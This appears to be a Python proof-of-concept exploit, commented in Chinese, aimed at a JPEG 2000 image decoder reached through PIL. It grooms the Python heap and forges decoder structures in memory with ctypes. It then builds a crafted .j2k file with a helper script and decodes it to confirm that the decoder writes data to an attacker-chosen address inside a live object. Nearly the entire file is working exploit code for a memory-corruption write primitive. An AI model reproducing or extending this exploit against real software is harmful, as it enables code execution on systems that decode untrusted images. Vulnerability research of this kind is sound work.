#!/usr/bin/env python3
# 单段验证：让【解码器自己】把解码数据写进一个【活对象】(victim+8)
#   payload 源用 4-tile 的 base.j2k（结构与 TLM 一致），只求“值确实被改变”这一铁证
import ctypes, gc, io, os, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value


def put64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def mkfake(target, res_addr):
    buf = bytearray(1024)
    fa = ctypes.addressof((ctypes.c_char * 1024).from_buffer(buf))
    put64(fa + 0x10, 1)
    put64(fa + 0x18, 1)
    put64(fa + 0x20, res_addr)
    put64(fa + 0x28, 40)
    put64(fa + 0x30, target)      # ★ data -> 目标
    put64(fa + 0x38, 0)
    put64(fa + 0x40, 4096)
    put64(fa + 0x48, 4096)
    return buf, fa


def groom_and_decode(path, tries=6):
    for t in range(tries):
        gc.collect()
        prime = [bytes(519) for _ in range(1024)]
        del prime
        pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
        good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
        if not good:
            del pairs
            continue
        ng = len(good)
        keep = [t2 for i, t2 in enumerate(good) if i != len(good) // 2]
        Ks2 = [B for (D, B) in keep]
        holeD = good[len(good) // 2][0]
        del holeD, pairs, good
        gc.collect()
        M = open(path, 'rb').read()
        try:
            im = Image.open(io.BytesIO(M)); im.load()
            return (im.size, ng)
        except BaseException as e:
            return ("ERR %r" % (e,), ng)
    return (None, 0)


# ---- 受害者：>=512B 的 bytes（brk 堆、地址低）----
victim = bytes(bytearray(1024))
VADDR = id(victim)
print("[*] victim=%#x 可表达=%s" % (VADDR, VADDR < 0x1000000))
if VADDR >= 0x1000000:
    print("[!] victim 地址太高"); sys.exit(1)
print("[*] 原始: +8=%#x  +0x10=%#x" % (R(VADDR + 8), R(VADDR + 0x10)))

# ---- 伪造 resolution ----
res_buf = bytearray(512)
RESADDR = ctypes.addressof((ctypes.c_char * 512).from_buffer(res_buf))
put64(RESADDR + 0x08, 16)
put64(RESADDR + 0x0c, 16)
put64(RESADDR + 0x10, 1)
put64(RESADDR + 0x14, 1)

# ---- 伪造 tilecomp，data -> victim+8 ----
fake_buf, FAKE = mkfake(VADDR + 8, RESADDR)
A = FAKE - 0x0c
B = A + 0x1000
C = A + 0x4000
print("[*] FAKE=%#x  A=%#x  data 目标=%#x" % (FAKE, A, VADDR + 8))

r = subprocess.run(['python3', '/tmp/mk13.py', '/tmp/exp/base.j2k', '/tmp/F.j2k', '0', '23',
                    hex(A), hex(B), hex(C), '-370'], capture_output=True, text=True)
print("[*] build:", (r.stdout + r.stderr).strip()[:60])
if 'OK' not in r.stdout:
    sys.exit(1)

res, ng = groom_and_decode('/tmp/F.j2k')
print("[*] 解码=%s   相邻对=%d" % (res, ng))
print("[*] 之后: victim+0x00..0x1f =", ctypes.string_at(VADDR, 32).hex())
print("[*] 之后: +8=%#x  +0x10=%#x" % (R(VADDR + 8), R(VADDR + 0x10)))

if R(VADDR + 8) != 0xa22670 or ctypes.string_at(VADDR, 32).hex().startswith("0098"):
    print("\n★★★ 解码器把数据写进了【活对象】(victim+8)：内容已被改变")
    print("    => 解码驱动写（目标=活对象、地址=我们指定）成立 ✓")
else:
    print("[-] 未观察到写入")

# ---- 附加：验证解码输出的前几个样本（证明写的就是解码数据）----
b = open('/tmp/exp/base.j2k', 'rb').read()
im = Image.open(io.BytesIO(b)); im.load()
print("[*] base 解码样本前 4 个:", [hex(v) for v in list(im.getdata())[:4]])